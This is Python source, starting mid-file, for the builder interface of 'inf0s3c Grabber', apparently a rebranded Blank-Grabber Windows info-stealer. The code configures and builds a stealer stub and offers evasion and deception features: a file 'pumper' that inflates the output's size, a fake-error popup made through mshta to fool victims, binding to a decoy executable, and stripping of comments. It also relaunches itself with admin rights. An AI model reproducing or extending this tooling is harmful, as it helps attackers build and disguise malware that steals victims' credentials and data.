            self.fakeErrorVar.set(self.fakeErrorData[0])
    
    def pumpStub_Event(self) -> None:
        if not self.pumpStubVar.get():
            self.pumpLimit = 0
        else:
            pumperSettings = PumperSettings(self)
            self.wait_window(pumperSettings)
            self.pumpStubVar.set(pumperSettings.limit > 0)
            self.pumpLimit = pumperSettings.limit * 1024 * 1024 # Convert to bytes

class PumperSettings(ctk.CTkToplevel):

    def __init__(self, master) -> None:
        super().__init__(master)
        self.title("inf0s3c Grabber [File Pumper]")
        self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
        self.grab_set()
        self.geometry("400x150")
        self.resizable(False, False)
        
        self.limit = 0
        self.limitVar = ctk.StringVar(self, value= str(self.limit))
        self.font = ctk.CTkFont(size= 16)

        self.rowconfigure(0, weight= 1)
        self.rowconfigure(1, weight= 1)
        self.rowconfigure(2, weight= 1)

        self.columnconfigure(0, weight= 1)
        self.columnconfigure(1, weight= 1)
        self.columnconfigure(2, weight= 1)

        noteLabel = ctk.CTkLabel(self, text= "Specify the pumped output file size (in MB):", font= self.font)
        noteLabel.grid(row= 0, column= 0, columnspan= 3, padx= 10)

        limitEntry = ctk.CTkEntry(self, text_color= "white", textvariable= self.limitVar, font= self.font)
        limitEntry.grid(row= 1, column= 1, padx= 10, pady= 5)
        limitEntry.bind("<KeyRelease>", self.on_limit_change)

        self.okButton = ctk.CTkButton(self, text= "OK", font= self.font, fg_color= "green", hover_color= "light green", text_color_disabled= "white", command= self.ok_Event)
        self.okButton.grid(row= 2, column= 1, padx= 10, pady= 5)

    def ok_Event(self) -> None:
        if self.limitVar.get().isdigit():
            self.limit = int(self.limitVar.get())
            self.destroy()
        else:
            messagebox.showerror("Error", "The size should be a positive number!")
    
    def on_limit_change(self, _):
        limitBoxText = self.limitVar.get()
        if limitBoxText.isdigit():
            self.okButton.configure(state= "normal")
            self.okButton.configure(fg_color= "green")
        else:
            self.okButton.configure(state= "disabled")
            self.okButton.configure(fg_color= "red")
    
class FakeErrorBuilder(ctk.CTkToplevel):

    def __init__(self, master) -> None:
        super().__init__(master)
        self.title("inf0s3c Grabber [Fake Error Builder]")
        self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
        self.grab_set()
        self.geometry("600x400")
        self.resizable(True, False)

        self.master = master
        self.font = ctk.CTkFont(size= 16)

        self.rowconfigure(0, weight= 1)
        self.rowconfigure(1, weight= 1)
        self.rowconfigure(2, weight= 1)
        self.rowconfigure(3, weight= 1)
        self.rowconfigure(4, weight= 1)
        self.rowconfigure(5, weight= 1)
        self.rowconfigure(6, weight= 1)
        self.rowconfigure(7, weight= 1)
        self.rowconfigure(8, weight= 2)

        self.columnconfigure(1, weight= 1)

        self.iconVar = ctk.IntVar(self, value= 0)

        self.titleEntry = ctk.CTkEntry(self, placeholder_text= "Enter title here", height= 30, font= self.font)
        self.titleEntry.grid(row = 0, column= 1, padx= 10, sticky= "ew", columnspan= 2)

        self.messageEntry = ctk.CTkEntry(self, placeholder_text= "Enter message here", height= 30, font= self.font)
        self.messageEntry.grid(row = 1, column= 1, padx= 10, sticky= "ew", columnspan= 2)

        self.iconChoiceSt = ctk.CTkRadioButton(self, text= "Stop", value= 0, variable= self.iconVar, font= self.font)
        self.iconChoiceSt.grid(row= 4, column= 1, sticky= "w", padx= 10)

        self.iconChoiceQn = ctk.CTkRadioButton(self, text= "Question", value= 16, variable= self.iconVar, font= self.font)
        self.iconChoiceQn.grid(row= 5, column= 1, sticky= "w", padx= 10)

        self.iconChoiceWa = ctk.CTkRadioButton(self, text= "Warning", value= 32, variable= self.iconVar, font= self.font)
        self.iconChoiceWa.grid(row= 6, column= 1, sticky= "w", padx= 10)

        self.iconChoiceIn = ctk.CTkRadioButton(self, text= "Information", value= 48, variable= self.iconVar, font= self.font)
        self.iconChoiceIn.grid(row= 7, column= 1, sticky= "w", padx= 10)

        self.testButton = ctk.CTkButton(self, text= "Test", height= 25, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", command= self.testFakeError)
        self.testButton.grid(row= 4, column= 2, padx= 10)

        self.saveButton = ctk.CTkButton(self, text= "Save", height= 25, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", command= self.saveFakeError)
        self.saveButton.grid(row= 5, column= 2, padx= 10)
    
    def testFakeError(self) -> None:
        title= self.titleEntry.get()
        message= self.messageEntry.get()
        icon= self.iconVar.get()

        if title.strip() == "":
            title= "Title"
            self.titleEntry.insert(0, title)
        
        if message.strip() == "":
            message= "Message"
            self.messageEntry.insert(0, message)
        
        cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{}', 0, '{}', {}+16);close()"'''.format(message, title, icon)
        subprocess.Popen(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
    
    def saveFakeError(self) -> None:
        title= self.titleEntry.get().replace("\x22", "\\x22").replace("\x27", "\\x27")
        message= self.messageEntry.get().replace("\x22", "\\x22").replace("\x27", "\\x27")

        icon= self.iconVar.get()

        if title.strip() == message.strip() == "":
            self.master.fakeErrorData = [False, ("", "", 0)]
            self.destroy()

        elif title.strip() == "":
            cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('Title cannot be empty', 0, 'Error', 0+16);close()"'''.format(message, title, icon)
            subprocess.run(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
            return
        
        elif message.strip() == "":
            cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('Message cannot be empty', 0, 'Error', 0+16);close()"'''.format(message, title, icon)
            subprocess.run(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
            return
        
        self.master.fakeErrorData = [True, (title, message, icon)]
        self.destroy()

class Builder(ctk.CTk):
    
    def __init__(self) -> None:
        super().__init__()

        self.title("inf0s3c Grabber [Builder]")
        self.iconbitmap(os.path.join("Extras", "icon.ico"))
        self.geometry("750x480")
        self.resizable(False, False)

        # Configure grid layout
        self.rowconfigure(0, weight=1)
        self.rowconfigure(1, weight=10)
        
        self.columnconfigure(0, weight=1)

        # Header Frame
        self.header_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.header_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=5)
        
        # Title Label
        self.titleLabel = ctk.CTkLabel(
            self.header_frame, 
            text="inf0s3c Grabber", 
            font=ctk.CTkFont(size=32, weight="bold"), 
            text_color=Colors.PRIMARY
        )
        self.titleLabel.pack(side="left", padx=10)

        # Version/Info Label
        self.versionLabel = ctk.CTkLabel(
            self.header_frame, 
            text="Builder v1.0", 
            font=ctk.CTkFont(size=14),
            text_color=Colors.TEXT
        )
        self.versionLabel.pack(side="right", padx=10)

        # Main Content Frame
        self.builderOptions = BuilderOptionsFrame(self)
        self.builderOptions.grid(row=1, column=0, sticky="nsew", padx=10, pady=(0, 10))
    
    def BuildPythonFile(self, config: str) -> None:
        options = json.loads(config)
        outPath = filedialog.asksaveasfilename(confirmoverwrite= True, filetypes= [("Python Script", ["*.py","*.pyw"])], initialfile= "stub" + (".py" if options["settings"]["consoleMode"] == 2 else ".pyw"), title= "Save as")
        if outPath is None or not os.path.isdir(os.path.dirname(outPath)):
            return
        
        with open(os.path.join(os.path.dirname(__file__), "Components", "stub.py")) as file:
            code = file.read()
        
        sys.path.append(os.path.join(os.path.dirname(__file__), "Components")) # Adds Components to PATH

        if os.path.isdir(os.path.join(os.path.dirname(__file__), "Components", "__pycache__")):
            try:
                shutil.rmtree(os.path.join(os.path.dirname(__file__), "Components", "__pycache__"))
            except Exception:
                pass
        from Components import process
        _, injection = process.ReadSettings()
        code = process.WriteSettings(code, options, injection)

        if os.path.isfile(outPath):
            os.remove(outPath)

        try: 
            code = ast.unparse(ast.parse(code)) # Removes comments
        except Exception: 
            pass

        code = "# pip install pyaesm urllib3\n\n" + code

        with open(outPath, "w") as file:
            file.write(code)

        messagebox.showinfo("Success", "File saved as %r" % outPath)
    
    def BuildExecutable(self, config: str, iconFileBytes: bytes, boundFilePath: str) -> None:
        def Exit(code: int = 0) -> None:
            os.system("pause > NUL")
            exit(code)
        
        def clear() -> None:
            os.system("cls")
        
        def format(title: str, description: str) -> str:
            return "[{}\u001b[0m] \u001b[37;1m{}\u001b[0m".format(title, description)
        
        self.destroy()
        Utility.ToggleConsole(True)
        ctypes.windll.user32.FlashWindow(ctypes.windll.kernel32.GetConsoleWindow(), True)
        clear()

        if not os.path.isfile(os.path.join("env", "Scripts", "run.bat")):
            if not os.path.isfile(os.path.join("env", "Scripts", "activate")):
                print(format("\u001b[33;1mINFO", "Creating virtual environment... (might take some time)"))
                res = subprocess.run("python -m venv env", capture_output= True, shell= True)
                clear()
                if res.returncode != 0:
                    print('Error while creating virtual environment ("python -m venv env"): {}'.format(res.stderr.decode(errors= "ignore")))
                    Exit(1)

        print(format("\u001b[33;1mINFO", "Copying assets to virtual environment..."))
        for i in os.listdir(datadir := os.path.join(os.path.dirname(__file__), "Components")):
            if os.path.isfile(fileloc := os.path.join(datadir, i)):
                shutil.copyfile(fileloc, os.path.join(os.path.dirname(__file__), "env", "Scripts", i))
            else:
                shutil.copytree(fileloc, os.path.join(os.path.dirname(__file__), "env", "Scripts", i))

        with open(os.path.join(os.path.dirname(__file__), "env", "Scripts", "config.json"), "w", encoding= "utf-8", errors= "ignore") as file:
            file.write(config)

        clear()

        os.chdir(os.path.join(os.path.dirname(__file__), "env", "Scripts"))

        if os.path.isfile("icon.ico"):
            os.remove("icon.ico")
        
        if iconFileBytes:
            with open("icon.ico", "wb") as file:
                file.write(iconFileBytes)

        if os.path.isfile("bound.exe"):
            os.remove("bound.exe")

        if os.path.isfile(boundFilePath):
            shutil.copy(boundFilePath, "bound.exe")

        os.startfile("run.bat")

if __name__ == "__main__":

    if os.name == "nt":
        if not os.path.isdir(os.path.join(os.path.dirname(__file__), "Components")):
            subprocess.Popen('mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Components folder cannot be found. Please redownload the files!\', 10, \'Error\', 16);close()"', 
                            shell=True, 
                            creationflags=subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
            exit(1)
        
        version = '.'.join([str(x) for x in (sys.version_info.major, sys.version_info.minor, sys.version_info.micro)])
        if not (parse_version(version) > parse_version("3.10")):
            subprocess.Popen(
                f'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Your Python version is {version} but version 3.10+ is required. Please update your Python installation!\', 10, \'Error\', 16);close()"', 
                shell=True, 
                creationflags=subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE
            )
            exit(1)

        Utility.CheckConfiguration()
        
        if Utility.CheckForUpdates():
            response = messagebox.askyesno(
                "Update Checker", 
                "A new version of the application is available. It is recommended that you update it to the latest version.\n\nDo you want to update the app? (you would be directed to the official github repository)"
            )
            if response:
                webbrowser.open_new_tab("https://github.com/Blank-c/Blank-Grabber")
                exit(0)
    
        # Do not hide console so it can show if there is any error
        # Utility.ToggleConsole(False)
        
        if not Utility.IsAdmin():
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            exit(0)
        
        Builder().mainloop()

    else:
        print("Only Windows OS is supported!")